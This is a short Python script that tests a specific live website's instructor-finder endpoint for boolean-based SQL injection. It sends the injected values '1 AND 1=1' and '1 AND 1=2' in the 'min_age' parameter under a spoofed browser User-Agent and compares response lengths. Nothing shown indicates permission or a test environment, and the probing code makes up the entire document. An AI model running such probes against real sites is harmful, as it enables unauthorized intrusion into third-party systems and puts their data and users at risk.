import requests

TARGET = "https://learnyway.com/instructor-finder"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
}

def test_sqli():
    print(f"[*] Testing {TARGET}")
    
    # TRUE Condition
    r_true = requests.get(TARGET, params={"min_age": "1 AND 1=1"}, headers=HEADERS, timeout=15)
    len_true = len(r_true.text)
    
    # FALSE Condition
    r_false = requests.get(TARGET, params={"min_age": "1 AND 1=2"}, headers=HEADERS, timeout=15)
    len_false = len(r_false.text)
    
    print(f"TRUE Length : {len_true}")
    print(f"FALSE Length: {len_false}")
    print(f"Difference  : {abs(len_true - len_false)} bytes")

if __name__ == "__main__":
    test_sqli()
